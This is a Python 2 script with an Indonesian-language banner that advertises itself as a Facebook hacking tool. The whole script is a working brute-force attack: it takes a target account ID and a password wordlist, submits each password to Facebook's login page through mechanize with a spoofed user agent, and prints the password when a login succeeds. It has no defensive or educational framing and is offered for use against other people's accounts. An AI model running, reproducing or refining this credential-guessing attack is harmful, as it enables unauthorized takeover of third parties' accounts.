import os, sys, time, random, cookielib, mechanize
wd = '\x1b[90;1m'
GL = '\x1b[96;1m'
BB = '\x1b[34;1m'
YY = '\x1b[33;1m'
GG = '\x1b[32;1m'
WW = '\x1b[0;1m'
RR = '\x1b[31;1m'
CC = '\x1b[36;1m'
B = '\x1b[34m'
Y = '\x1b[33;1m'
G = '\x1b[32m'
W = '\x1b[0;1m'
R = '\x1b[31m'
C = '\x1b[36;1m'

def runntxt(s):
    for noobs in s + '\n':
        sys.stdout.write(noobs)
        sys.stdout.flush()
        time.sleep(10.0 / 2100)


def banner():
    os.system('clear')
    print ' '
    runntxt(GL + "              Assalamu'@laikum. ^_^")
    runntxt(WW + '                 ')
    runntxt(WW + '            \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90  \xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x94\xac\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac ')
    runntxt(GL + '            \xe2\x95\xa0\xe2\x95\x90\xe2\x95\xa3\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4  \xe2\x95\xa0\xe2\x95\xa6\xe2\x95\x9d\xe2\x94\x82\xe2\x94\x94\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4 \xe2\x94\x82\xe2\x94\x82\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4')
    runntxt(GG + '            \xe2\x95\xa9 \xe2\x95\xa9\xe2\x94\xb4 \xe2\x94\xb4  \xe2\x95\xa9\xe2\x95\x9a\xe2\x95\x90\xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x80\xe2\x94\xb4\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4')
    runntxt(Y + '        =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=')
    runntxt(GG + '            Badru Wasil Riyadh Zuhud  ')
    time.sleep(1.5)
    print GG + '  \xe2\x88\x9a=============================================\xe2\x88\x9a'
    print GL + '  |\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2   NEW TOOLS HACK FACEBOOK BF.   \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2|'
    print GG + '  \xe2\x88\x9a=============================================\xe2\x88\x9a'
    print WW + '  |            MOD BY: Aa Riyadh ID             |'
    print GL + '  |       Berdoa Dulu Sebelum Menggunakan       |'
    print WW + '  |       FACEBOOK: Badru Wasil Riyadh Zuhud    |'
    print Y + '  |       WhatsApp: 085887469744                |'
    print GL + '  |---------------------------------------------|'
    print GL + '  |        LIFE OF PROGRAMMER [ L.O.P ]         |'
    print GL + '  |---------------------------------------------|'
    print GG + '  \xe2\x88\x9a=============================================\xe2\x88\x9a'
    print GL + '  |\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2   HACK FACEBOOK Aa  ^_^   \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2|'
    print GG + '  \xe2\x88\x9a=============================================\xe2\x88\x9a'


banner()
print wd + '         https://www.facebook.com/AaRiyadhID '
print GG + '\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[91m[\x1b[96m Masukkan ID\x1b[95m / \x1b[96mUsername Target\x1b[91m ] '
email_target = str(raw_input(GL + '\x1b[92m\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9e\xb2\x1b[93m  '))
print ' '
print '\x1b[92m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[91m[ \x1b[96mMasukkan File Wordlist \x1b[95m( pass1/pass2/pass3/pass4/pass5/pass6 Jangan Lupa Tambahkan .txt ) \x1b[91;1m]'
password_list = str(raw_input(GG + '\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9e\xb2\x1b[93m '))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def pil():
    print GG + ' '
    g = str(raw_input('[?] Hack Fb lagi..\x1b[93;1m[y/n]: '))
    if g == 'y' or g == 'Y':
        os.system('python2 brute.py')
    elif g == 'n' or g == 'N':
        print wd + 'Keluar dari program...'
        sys.exit()
    else:
        print RR + 'Pilih yang bener cuk...'
        pil()


def edit_wordlist():
    global password_list
    print GG + ' '
    ed = str(raw_input('[?] Edit wordlist cuk.? \x1b[96;1m[y/n]: '))
    if ed == 'y' or ed == 'Y':
        os.system('nano ' + password_list)
        pil()
    elif ed == 'n' or ed == 'N':
        print wd + 'Keluar Dari Program...'
        sys.exit()
    else:
        print RR + 'Pilih yg bener cuk...'
        edit_wordlist()


def main():
    global noobs
    noobs = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    noobs.set_handle_robots(False)
    noobs.set_handle_redirect(True)
    noobs.set_cookiejar(cj)
    noobs.set_handle_equiv(True)
    noobs.set_handle_referer(True)
    noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    runn_noobs()
    life()
    print ' '
    print RR + ' wordlist tidak ada yg cocok...'
    print ' '


def iqbalz(iqbalz_password):
    try:
        sys.stdout.write(GG + '\n[\x1b[91m+\x1b[92m]\x1b[91;1m [\x1b[97m' + email_target + '\x1b[91m]\x1b[90m Mencoba ==> \x1b[91m[\x1b[90;1m' + iqbalz_password)
        sys.stdout.flush()
        noobs.addheaders = [('User-agent', random.choice(useragents))]
        site = noobs.open(login)
        noobs.select_form(nr=0)
        noobs.form['email'] = email_target
        noobs.form['pass'] = iqbalz_password
        tom = noobs.submit()
        mask = tom.geturl()
        if mask != login and 'login_attempt' not in mask:
            print ' '
            print '\x1b[96m                S U C C E S S'
            print '          P A S S W O R D  F I N D '
            print RR + '+-------------------------------------------+'
            print (RR + '#\x1b[97m ID / Email Target:\x1b[92m {}').format(email_target)
            print (RR + '#\x1b[97m Password Target:\x1b[92m {}').format(iqbalz_password)
            print ' '
            raw_input(WW + 'TEKAN ENTER UNTUK KELUAR...')
            sys.exit(1)
    except KeyboardInterrupt:
        print wd + 'Stop.......'
        edit_wordlist()
        sys.exit()


def life():
    global iqbalz_password
    password_nob = open(password_list, 'r')
    for iqbalz_password in password_nob:
        password_nob = iqbalz_password.replace('\n', '')
        iqbalz(iqbalz_password)


def runn_noobs():
    lop = GG + '\n\n                  `.-://////:-.`\n              .:+o+:-..````..-:+o+:.\n           `:o+-`                `:+o:`\n         `/o:`                      `:o/`\n        -s/`  .-..`            `..--` `/s-\n       /o.   `:.`.-:----------:-.``:-   .o/\n      /o`    .:`    `              --    `o/\n     -s.     .:`                   --     .s-\n     o/     .:`                     --     +o\n    .s-     :.                      `:`    -s`\n    .s.     :.                      `:`    .s.\n    .s-     --                      .:     -s.\n     o/     `-.                    `-.     /o\n     -s.     `--`                `.-`     .s-\n      /o` ----``..--..`    `...--.`      `o/\n       /o. `----`  `-.      `-.         .o/\n        -o:  -.......        ..       `:o-\n         `:o:``....--        ..     `:o:`\n           `:+/-`  `-        ..  `-/+:`\n              `-/+///..````..://+/-`\n                  `.-::////::-.` \x1b[91;1m\n\n                \x1b[90;1mLife Of Programmer\x1b[91;1m\n             Powered by:\x1b[97m Aa Riyadh ID\n      '
    print lop
    nuub = open(password_list, 'r')
    nuub = nuub.readlines()
    print wd + (' [#] ID / Username Target\x1b[97;1m: {}').format(email_target)
    print wd + ' [#] JUmlah Password saat ini\x1b[97;1m:', len(nuub), 'password'
    print wd + ' [#] Tunggu Proses Cracking\x1b[97;1m..........'
    print ' '


if __name__ == '__main__':
    main()
